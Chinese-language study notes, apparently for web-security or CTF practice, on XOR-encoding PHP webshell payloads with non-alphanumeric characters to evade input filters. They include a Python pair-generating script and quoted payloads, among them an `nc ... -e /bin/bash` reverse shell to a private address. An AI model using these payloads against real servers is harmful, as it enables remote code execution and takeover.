## 前置知识
---

异或运算`a^b`：
- a、b不相同=>1
- a、b相   同=>0

```php
<?php
echo "5"^"Z";
?>
=> o

'5'的二进制:`echo base_convert(bin2hex('5'), 16, 2)`:00110101
'Z'的二进制:`echo base_convert(bin2hex('Z'), 16, 2)`:01011010
则'00110101'^'01011010'='01101111'(即得'o')
```

## XOR编码脚本
```python
target_cmd = "_POST"

def is_invalid(char):
    return char.isalnum()

res1 = ""
res2 = ""

for char in target_cmd:
    target_ascii = ord(char)
    found = False

    for x in range(33, 127):
        if is_invalid(chr(x)):
            continue

        for y in range(33, 127):
            if is_invalid(chr(y)):
                continue

            if (x ^ y) == target_ascii:
                res1 += chr(x)
                res2 += chr(y)
                found = True
                break
        if found:
            break

print("===生成成果===")
print(f"Result1 (异或第一部分): {res1}")
print(f"Result2 (异或第二部分): {res2}")
print(f'result="{res1}"^"{res2}"')
print("\n===验证还原===")
recovered = ""
for a, b in zip(res1, res2):
    recovered += chr(ord(a) ^ ord(b))
print(f"异或还原后的命令: {recovered}")
```

## Q&A
---

### Q：为什么PHP5中`$_($___['_']);`，而PHP7中`$__[_];`的变量`_`没有引号包裹？
A:

PHP5的payload是正确的

但PHP7的这个payload也能正常运行，

是由于PHP的宽容

自动将`未定义常量 _ → 自动当成字符串 '_'`


### Q：为什么PHP5中`_=system('ls');`，而PHP7中`_=nc 192.168.1.161 7777 -e /bin/bash`的指令没有分号结尾？
A：

- PHP5的环境是assert（PHP代码）
	- 而PHP 语法的规则是：**每一行代码结尾必须写分号；**

- PHP7的环境是反引号（系统指令）
	- 而Linux指令的规则是：**每一行代码结尾不必写分号；**
